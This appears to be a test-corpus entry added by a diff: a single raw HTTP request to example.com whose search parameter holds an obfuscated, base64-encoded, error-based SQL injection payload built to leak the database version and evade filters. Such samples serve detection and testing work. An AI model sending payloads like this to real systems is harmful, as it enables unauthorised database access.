@@ -1,0 +1,6 @@
+GET /settings?search=%27%20CHAR%2879%2C82%29%20decode%28%27IGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSx2ZXJzaW9uKCkpKS0t%27%2C%20%27base64%27%29--%253b%20/%2A%2154421SELECT%2A/%20NULL HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
